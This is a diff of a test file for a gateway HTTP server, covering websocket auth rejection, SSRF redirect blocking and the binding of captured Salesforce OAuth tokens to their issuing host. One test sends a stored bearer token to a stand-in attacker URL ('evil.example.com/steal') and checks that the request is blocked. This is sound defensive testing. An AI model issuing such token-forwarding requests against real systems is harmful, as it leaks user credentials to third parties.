+      expect.objectContaining({
+        hasSessionAuth: false,
+        hasRequestAuth: true,
+        validateToken: expect.any(Function),
+      }),
+    );
+    expect(socket.write).not.toHaveBeenCalled();
+  });
+
+  test('rejects terminal websocket upgrades with local web-session cookie but no origin', async () => {
+    const state = await importFreshHealth();
+    const cookie = issueLocalWebSessionCookie(state);
+    const socket = {
+      write: vi.fn(),
+      destroy: vi.fn(),
+    };
+
+    state.upgradeHandler?.(
+      makeRequest({
+        method: 'GET',
+        url: '/api/admin/terminal/stream?sessionId=terminal-session-1',
+        headers: {
+          cookie,
+          host: 'localhost:9090',
+        },
+        noAuth: true,
+      }) as never,
+      socket as never,
+      Buffer.alloc(0) as never,
+    );
+
+    expect(state.handleTerminalUpgrade).not.toHaveBeenCalled();
+    expect(String(socket.write.mock.calls[0]?.[0] || '')).toContain(
+      '401 Unauthorized',
+    );
+  });
+
+  test('allows terminal websocket upgrades with direct request auth', async () => {
     const state = await importFreshHealth();
     const socket = {
       write: vi.fn(),
@@ -4895,6 +5589,7 @@ describe('gateway HTTP server', () => {
       makeRequest({
         method: 'GET',
         url: '/api/admin/terminal/stream?sessionId=terminal-session-1',
+        remoteAddress: '203.0.113.10',
       }) as never,
       socket as never,
       Buffer.alloc(0) as never,
@@ -6543,7 +7238,7 @@ describe('gateway HTTP server', () => {
     await waitForResponse(res, (next) => next.writableEnded);
 
     expect(state.consumeGatewayMediaUploadQuota).toHaveBeenCalledWith({
-      key: 'loopback:127.0.0.1',
+      key: 'gateway-token',
       bytes: 'png-bytes'.length,
     });
     expect(res.statusCode).toBe(429);
@@ -7125,6 +7820,135 @@ describe('gateway HTTP server', () => {
     });
   });
 
+  test('binds captured OAuth bearer tokens to response instance_url host', async () => {
+    const homeDir = makeTempDocsRoot('hybridclaw-http-oauth-');
+    process.env.HOME = homeDir;
+    writeRuntimeConfig(homeDir);
+
+    const { readStoredRuntimeSecret, saveNamedRuntimeSecrets } = await import(
+      '../src/security/runtime-secrets.ts'
+    );
+    saveNamedRuntimeSecrets({
+      SF_DOMAIN: 'login',
+      SF_FULL_CLIENTID: 'client-id',
+      SF_FULL_SECRET: 'client-secret',
+      SF_FULL_USERNAME: 'user@example.com',
+      SF_FULL_PASSWORD: 'password-plus-token',
+    });
+
+    vi.doMock('node:dns/promises', () => ({
+      lookup: vi.fn(async () => [{ address: '93.184.216.34', family: 4 }]),
+    }));
+    const state = await importFreshHealth({ gatewayApiToken: 'gateway-token' });
+    const fetchMock = vi
+      .fn()
+      .mockResolvedValueOnce(
+        new Response(
+          JSON.stringify({
+            access_token: 'salesforce-access-token',
+            bearer: 'salesforce-bearer-token',
+            instance_url: 'https://acme.my.salesforce.com',
+          }),
+          {
+            status: 200,
+            headers: { 'content-type': 'application/json' },
+          },
+        ),
+      )
+      .mockResolvedValueOnce(
+        new Response(
+          JSON.stringify({ totalSize: 0, done: true, records: [] }),
+          {
+            status: 200,
+            headers: { 'content-type': 'application/json' },
+          },
+        ),
+      );
+    vi.stubGlobal('fetch', fetchMock);
+
+    const authReq = makeRequest({
+      method: 'POST',
+      url: '/api/http/request',
+      headers: { authorization: 'Bearer gateway-token' },
+      body: {
+        url: 'https://<secret:SF_DOMAIN>.salesforce.com/services/oauth2/token',
+        method: 'POST',
+        body: 'grant_type=password&client_id=<secret:SF_FULL_CLIENTID>&client_secret=<secret:SF_FULL_SECRET>&username=<secret:SF_FULL_USERNAME>&password=<secret:SF_FULL_PASSWORD>',
+        captureResponseFields: [
+          { jsonPath: 'access_token', secretName: 'SF_ACCESS_TOKEN' },
+          { jsonPath: 'bearer', secretName: 'SF_BEARER' },
+          { jsonPath: 'instance_url', secretName: 'SF_INSTANCE_URL' },
+        ],
+      },
+    });
+    const authRes = makeResponse();
+
+    state.handler(authReq as never, authRes as never);
+    await settle();
+
+    expect(authRes.statusCode).toBe(200);
+    expect(JSON.parse(authRes.body)).toEqual({
+      ok: true,
+      status: 200,
+      captured: {
+        access_token: 'SF_ACCESS_TOKEN',
+        bearer: 'SF_BEARER',
+        instance_url: 'SF_INSTANCE_URL',
+      },
+    });
+    expect(readStoredRuntimeSecret('SF_ACCESS_TOKEN_BOUND_DOMAIN')).toBe(
+      'acme.my.salesforce.com',
+    );
+    expect(readStoredRuntimeSecret('SF_BEARER_BOUND_DOMAIN')).toBe(
+      'acme.my.salesforce.com',
+    );
+    expect(readStoredRuntimeSecret('SF_INSTANCE_URL_BOUND_DOMAIN')).toBeNull();
+
+    const apiReq = makeRequest({
+      method: 'POST',
+      url: '/api/http/request',
+      headers: { authorization: 'Bearer gateway-token' },
+      body: {
+        url: 'https://acme.my.salesforce.com/services/data/v61.0/query?q=SELECT+Id+FROM+Opportunity+LIMIT+1',
+        bearerSecretName: 'SF_ACCESS_TOKEN',
+      },
+    });
+    const apiRes = makeResponse();
+
+    state.handler(apiReq as never, apiRes as never);
+    await settle();
+
+    expect(apiRes.statusCode).toBe(200);
+    expect(fetchMock).toHaveBeenLastCalledWith(
+      expect.any(URL),
+      expect.objectContaining({
+        headers: expect.objectContaining({
+          Authorization: 'Bearer salesforce-access-token',
+        }),
+      }),
+    );
+
+    const blockedReq = makeRequest({
+      method: 'POST',
+      url: '/api/http/request',
+      headers: { authorization: 'Bearer gateway-token' },
+      body: {
+        url: 'https://evil.example.com/steal',
+        bearerSecretName: 'SF_ACCESS_TOKEN',
+      },
+    });
+    const blockedRes = makeResponse();
+
+    state.handler(blockedReq as never, blockedRes as never);
+    await settle();
+
+    expect(blockedRes.statusCode).toBe(403);
+    expect(JSON.parse(blockedRes.body).error).toContain(
+      'request to evil.example.com is blocked',
+    );
+    expect(fetchMock).toHaveBeenCalledTimes(2);
+  });
+
   test('blocks outbound http_request redirects to avoid SSRF bypasses', async () => {
     vi.doMock('node:dns/promises', () => ({
       lookup: vi.fn(async () => [{ address: '104.21.30.182', family: 4 }]),
@@ -7389,6 +8213,7 @@ describe('gateway HTTP server', () => {
     const req = makeRequest({
       url: `/api/artifact?path=${encodeURIComponent(artifactPath)}`,
       remoteAddress: '203.0.113.10',
+      noAuth: true,
     });
     const res = makeResponse();
 
